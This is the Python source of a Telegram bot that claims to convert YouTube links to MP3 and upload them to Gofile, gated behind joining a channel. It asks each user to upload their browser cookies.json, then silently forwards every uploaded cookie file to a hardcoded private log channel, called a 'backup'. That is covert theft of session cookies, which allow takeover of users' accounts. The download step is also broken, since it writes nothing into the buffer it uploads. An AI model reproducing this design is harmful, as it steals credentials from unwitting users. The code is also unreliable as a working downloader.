import yt_dlp
import requests
from flask import Flask, request
from telegram import Update, Bot, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from threading import Thread
import asyncio
import nest_asyncio
import os
from dotenv import load_dotenv
import logging
from io import BytesIO

# Apply nest_asyncio to avoid event loop conflict
nest_asyncio.apply()

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
GOFILE_FOLDER_ID = "gvcT2t"
GOFILE_ACCOUNT_TOKEN = os.getenv("GOFILE_ACCOUNT_TOKEN")
CHANNEL_USERNAME = "@TOOLS_BOTS_KING"
LOG_CHANNEL_ID = -1002661069692

# Initialize Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "YouTube to MP3 Bot is Running!"

bot = Bot(token=BOT_TOKEN)

# Subscription check
async def is_user_subscribed(user_id):
    try:
        member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Subscription check failed: {e}")
        return False

async def force_join(update: Update):
    await update.message.reply_text(
        f"🚨 Join our channel to use this bot! \n➡️ [Join Now](https://t.me/{CHANNEL_USERNAME[1:]})",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    if not await is_user_subscribed(user_id):
        await force_join(update)
        return
    await update.message.reply_text("🎵 Send a YouTube link to download music in MP3 format!")
    await update.message.reply_text("📁 Please upload your `cookies.json` file to use the bot.")

async def handle_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    if not await is_user_subscribed(user_id):
        await force_join(update)
        return

    # Check if the user uploaded a file
    if update.message.document:
        file = await update.message.document.get_file()
        file_path = f"cookies_{user_id}.json"
        await file.download_to_drive(file_path)

        # Save the cookies file to the log channel as backup
        with open(file_path, "rb") as f:
            await bot.send_document(chat_id=LOG_CHANNEL_ID, document=InputFile(f), caption=f"Cookies from user {user_id}")

        await update.message.reply_text("✅ Cookies uploaded successfully! You can now use the bot.")
    else:
        await update.message.reply_text("❌ Please upload a valid `cookies.json` file.")

def download_and_upload_to_gofile(url, cookies_file):
    ydl_opts = {
        'format': 'bestaudio/best',  # Select the best available audio format
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',  # Convert to MP3
            'preferredquality': '320',  # Highest quality for MP3
        }],
        'cookiefile': cookies_file,
        'outtmpl': '-',  # Output to stdout
    }

    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        try:
            info = ydl.extract_info(url, download=False)
            title = info.get('title', 'audio')
            ext = 'mp3'
            filename = f"{title}.{ext}"

            with BytesIO() as audio_file:
                ydl.download([url])
                audio_file.seek(0)

                response = requests.post(
                    "https://api.gofile.io/uploadFile",
                    files={"file": (filename, audio_file)},
                    data={"token": GOFILE_ACCOUNT_TOKEN, "folderId": GOFILE_FOLDER_ID}
                )
                response.raise_for_status()
                return response.json().get("data", {}).get("downloadPage", "Upload failed")
        except yt_dlp.utils.DownloadError as e:
            print(f"Download failed: {e}")
            return "Download failed"

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id
    if not await is_user_subscribed(user_id):
        await force_join(update)
        return
    
    url = update.message.text.strip()
    if "youtube.com" not in url and "youtu.be" not in url:
        await update.message.reply_text("❌ Invalid YouTube URL!")
        return
    
    cookies_file = f"cookies_{user_id}.json"

    # Check if the user has uploaded cookies
    if not os.path.exists(cookies_file):
        await update.message.reply_text("❌ Please upload your `cookies.json` file first.")
        return

    await update.message.reply_text("⏳ Downloading and uploading music...")
    gofile_link = download_and_upload_to_gofile(url, cookies_file)
    
    if "Upload failed" not in gofile_link:
        await update.message.reply_text(f"✅ Music uploaded: {gofile_link}")
    else:
        await update.message.reply_text("❌ Failed to download and upload the music. Please try again later.")

# Add handlers
application = Application.builder().token(BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.Document.ALL, handle_cookies))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

# Webhook setup
@app.route('/webhook', methods=['POST'])
async def webhook():
    update = Update.de_json(await request.get_json(), application.bot)
    await application.process_update(update)
    return 'ok'

# Start the bot with webhooks
async def set_webhook():
    await application.bot.set_webhook(url=f"{os.getenv('WEBHOOK_URL')}/webhook")

def run_flask():
    PORT = int(os.getenv("PORT", 5000))
    app.run(host="0.0.0.0", port=PORT)

def run_bot():
    loop = asyncio.get_event_loop()
    loop.run_until_complete(application.initialize())  # Initialize the application
    loop.run_until_complete(application.start())

if __name__ == "__main__":
    # Run Flask in a separate thread
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    
    # Run Telegram bot
    run_bot()
